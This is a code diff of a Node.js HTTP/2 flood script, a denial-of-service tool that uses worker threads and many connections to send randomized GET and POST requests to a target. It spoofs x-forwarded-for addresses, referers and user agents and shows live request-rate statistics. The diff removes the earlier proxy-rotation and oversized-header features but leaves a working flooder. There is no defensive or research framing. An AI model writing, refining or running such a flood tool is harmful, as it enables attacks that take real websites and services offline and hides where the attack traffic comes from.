@@ -1,13 +1,12 @@
 const http2 = require('http2');
-const tls = require('tls');
 const net = require('net');
-const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 const os = require('os');
 
 const THREADS = os.cpus().length;
-const MAX_INFLIGHT = 5000;
+const CONNECTIONS_PER_THREAD = 100;
+const MAX_INFLIGHT = 2000;
 const LIVE_REFRESH_RATE = 3000;
 
 let totalRequests = 0;
@@ -17,29 +16,14 @@ let maxRps = 0;
 let rpsLastSecond = 0;
 let end;
 
-// Load proxies
-let proxies = [];
-if (isMainThread) {
-    if (!fs.existsSync('proxies.txt')) {
-        console.error('Missing proxies.txt!');
-        process.exit(1);
-    }
-    proxies = fs.readFileSync('proxies.txt', 'utf-8')
-        .split('\n')
-        .map(p => p.trim())
-        .filter(p => p.length > 0);
-}
-
 function heavyHeaders(path) {
     return {
         ':method': Math.random() > 0.5 ? 'POST' : 'GET',
         ':path': '/' + path,
-        'x-forwarded-for': generateIP(),
-        'x-fake-header': 'X'.repeat(2048),
+        'x-forwarded-for': `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`,
         'accept-language': 'en-US,en;q=0.9',
         'cache-control': 'no-cache',
-        'content-type': 'application/json',
-        'referer': 'https://google.com/search?q=' + randomWord(),
+        'referer': 'https://google.com/search?q=' + Math.random().toString(36).substring(2),
         'origin': 'https://google.com',
         'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${randInt(70,120)}) Gecko/20100101 Firefox/${randInt(80,120)}`
     };
@@ -52,21 +36,13 @@ function generatePayload() {
     });
 }
 
-function generateIP() {
-    return `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`;
-}
-
-function randomWord() {
-    return Math.random().toString(36).substring(2, 10);
-}
-
 function randInt(min, max) {
     return Math.floor(Math.random() * (max - min)) + min;
 }
 
 function randomPath() {
-    const parts = ['api', 'login', 'submit', 'report', 'checkout', 'fetch'];
-    return parts[Math.floor(Math.random() * parts.length)] + `?id=${randomWord()}`;
+    const parts = ['api', 'login', 'submit', 'checkout', 'report'];
+    return parts[Math.floor(Math.random() * parts.length)] + `?id=${Math.random().toString(36).substring(2)}`;
 }
 
 if (isMainThread) {
@@ -80,16 +56,14 @@ if (isMainThread) {
     end = Date.now() + duration * 1000;
 
     console.clear();
-    console.log(`FLOOD WITH PROXIES | ${THREADS} THREADS`);
+    console.log(`🚀 HTTP/2 FLOOD STARTED | Threads: ${THREADS}`);
 
     for (let i = 0; i < THREADS; i++) {
-        const connections = 500;
         new Worker(__filename, {
             workerData: {
                 target,
                 duration,
-                connections,
-                proxies
+                connections: CONNECTIONS_PER_THREAD
             }
         });
     }
@@ -108,7 +82,7 @@ if (isMainThread) {
         const min = Math.floor(timeLeft / 60);
         const sec = Math.floor(timeLeft % 60);
 
-        console.log(`FLOOD WITH PROXIES`);
+        console.log(`🚀 HTTP/2 FLOOD`);
         console.log(`==============================`);
         console.log(`Total Requests : ${totalRequests}`);
         console.log(`Max RPS        : ${maxRps}`);
@@ -128,78 +102,61 @@ if (isMainThread) {
     server.listen(9999);
 
 } else {
-    const { target, duration, connections, proxies } = workerData;
+    const { target, duration, connections } = workerData;
     const endTime = Date.now() + duration * 1000;
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
     const url = new URL(target);
-    const host = url.hostname;
-    const port = 443;
+    const inflight = { count: 0 };
 
-    function sendLoop(client, inflight) {
-        while (Date.now() < endTime && inflight.count < MAX_INFLIGHT) {
-            try {
-                inflight.count++;
-                const path = randomPath();
-                const headers = heavyHeaders(path);
-                const isPost = headers[':method'] === 'POST';
-                const req = client.request(headers);
+    function sendLoop(client) {
+        if (Date.now() > endTime || inflight.count >= MAX_INFLIGHT) return;
 
-                req.on('response', () => {
-                    inflight.count--;
-                    sendStat('ok');
-                });
+        try {
+            inflight.count++;
+            const path = randomPath();
+            const headers = heavyHeaders(path);
+            const isPost = headers[':method'] === 'POST';
 
-                req.on('error', () => {
-                    inflight.count--;
-                    sendStat('err');
-                });
+            const req = client.request(headers);
 
-                if (isPost) {
-                    req.write(generatePayload());
-                }
+            req.on('response', () => {
+                inflight.count--;
+                sendStat('ok');
+            });
 
-                req.end();
-                sendStat('req');
-            } catch {
+            req.on('error', () => {
                 inflight.count--;
                 sendStat('err');
+            });
+
+            if (isPost) {
+                req.write(generatePayload());
             }
+
+            req.end();
+            sendStat('req');
+
+        } catch {
+            inflight.count--;
+            sendStat('err');
         }
 
-        if (Date.now() < endTime) {
-            setImmediate(() => sendLoop(client, inflight));
-        }
+        setImmediate(() => sendLoop(client));
     }
 
     function createConnection() {
         if (Date.now() > endTime) return;
 
-        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        const [proxyHost, proxyPort] = proxy.split(':');
+        try {
+            const client = http2.connect(target);
 
-        const conn = net.connect(proxyPort, proxyHost, () => {
-            const connectReq = `CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}\r\n\r\n`;
-            conn.write(connectReq);
-        });
-
-        conn.setTimeout(5000);
-
-        conn.once('data', (chunk) => {
-            if (!chunk.toString().includes('200')) {
-                conn.destroy();
-                return setTimeout(createConnection, 1000);
-            }
-
-            const tlsSocket = tls.connect({
-                socket: conn,
-                servername: host,
-                ALPNProtocols: ['h2']
+            client.on('connect', () => {
+                for (let i = 0; i < connections; i++) {
+                    sendLoop(client);
+                }
             });
-
-            const client = http2.connect(url.origin, { createConnection: () => tlsSocket });
-            const inflight = { count: 0 };
 
             client.on('error', () => {
                 client.destroy();
@@ -208,23 +165,9 @@ if (isMainThread) {
 
             client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 1000));
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) {
-                    sendLoop(client, inflight);
-                }
-            });
-        });
-
-        conn.on('error', () => {
-            conn.destroy();
+        } catch {
             setTimeout(createConnection, 1000);
-        });
-
-        conn.on('timeout', () => {
-            conn.destroy();
-            setTimeout(createConnection, 1000);
-        });
+        }
     }
 
     for (let i = 0; i < connections; i++) {
